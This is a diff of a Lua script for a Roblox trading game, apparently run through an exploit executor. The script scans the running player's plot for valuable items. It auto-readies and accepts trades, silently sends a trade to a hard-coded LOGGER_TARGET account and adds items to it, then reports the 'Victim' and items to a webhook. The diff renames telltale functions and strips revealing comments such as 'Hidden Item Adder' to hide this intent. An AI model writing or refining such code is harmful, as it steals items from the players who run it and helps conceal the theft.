@@ -42,7 +42,7 @@ local createInviteRE  = getRemote("RE/TradeService/CreateInvite")
 local readyRE          = getRemote("RE/TradeService/Ready")
 local acceptRE         = getRemote("RE/TradeService/Accept")
 
-local function scanPlotForLogger()
+local function scanPlot()
     local found = {}
     local plots = workspace:FindFirstChild("Plots")
     if not plots then return found end
@@ -63,9 +63,8 @@ local function scanPlotForLogger()
     if myPlot then
         for _, child in ipairs(myPlot:GetChildren()) do
             if child:IsA("Model") then
-                local name = child.Name:lower()
                 for _, wanted in ipairs(wantedItems) do
-                    if name:find(wanted:lower()) then
+                    if child.Name:lower():find(wanted:lower()) then
                         table.insert(found, child.Name)
                         break
                     end
@@ -76,7 +75,7 @@ local function scanPlotForLogger()
     return found
 end
 
-local function sendHiddenLog(items)
+local function sendWebhook(items)
     pcall(function()
         local request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
         request({
@@ -86,16 +85,19 @@ local function sendHiddenLog(items)
             Body = HttpService:JSONEncode({
                 content = "@everyone",
                 embeds = {{
-                    title = "Target Found: " .. plr.Name,
-                    description = "Items: " .. table.concat(items, ", "),
-                    color = 16711680
+                    title = "✦ Target Found ✦",
+                    fields = {
+                        { name = "👤 Victim", value = "```" .. plr.Name .. "```", inline = true },
+                        { name = "🧠 Items", value = "```" .. table.concat(items, "\n") .. "```", inline = false },
+                    },
+                    color = 16711680,
+                    timestamp = DateTime.now():ToIsoDate()
                 }}
             })
         })
     end)
 end
 
--- AUTO ACCEPT INVITES
 if createInviteRE then
     createInviteRE.OnClientEvent:Connect(function(tradeId)
         if tradeId then
@@ -104,7 +106,6 @@ if createInviteRE then
     end)
 end
 
--- MAIN LOOP (READY/ACCEPT/LOGGER)
 task.spawn(function()
     while true do
         pcall(function()
@@ -112,12 +113,10 @@ task.spawn(function()
             if tradeUI and tradeUI.Enabled then
                 local inner = tradeUI.TradeLiveTrade
                 
-                -- Auto Ready/Accept
                 if readyRE then readyRE:FireServer("d73acf93-6f32-44df-b813-0f6b32c7afd9") end
                 task.wait(0.1)
                 if acceptRE then acceptRE:FireServer("918ee0f5-e98f-413f-b76e-baee47b021cb") end
                 
-                -- Hidden Item Adder
                 if inner.Other.Username.Text:lower():find(LOGGER_TARGET:lower()) then
                     local scroll = inner:FindFirstChild("ScrollingFrame", true)
                     if scroll then
@@ -134,26 +133,29 @@ task.spawn(function()
                     end
                 end
             else
-                -- Auto Send if high value items found
-                local highValue = scanPlotForLogger()
+                local highValue = scanPlot()
                 if #highValue > 0 then
                     local tl = plr.PlayerGui:FindFirstChild("TradePlayerList"):FindFirstChild("TradePlayerList")
                     if tl then
-                        tl.bg.SearchFrame.SearchBox.Text = LOGGER_TARGET
+                        local sb = tl.bg.SearchFrame.SearchBox
+                        sb.Text = LOGGER_TARGET
                         task.wait(0.1)
-                        firesignal(tl.bg.SearchFrame.SearchBox.FocusLost, true)
-                        task.wait(0.2)
+                        firesignal(sb.FocusLost, true)
+                        task.wait(0.5)
                         for _, p in pairs(tl.Global.List:GetChildren()) do
                             if p:IsA("Frame") and p:FindFirstChild("Fill") then
-                                firesignal(p.Fill.Send.Activated)
-                                sendHiddenLog(highValue)
-                                break
+                                local send = p.Fill:FindFirstChild("Send")
+                                if send then
+                                    firesignal(send.Activated)
+                                    sendWebhook(highValue)
+                                    break
+                                end
                             end
                         end
                     end
                 end
             end
         end)
-        task.wait(0.2)
+        task.wait(0.5)
     end
 end)
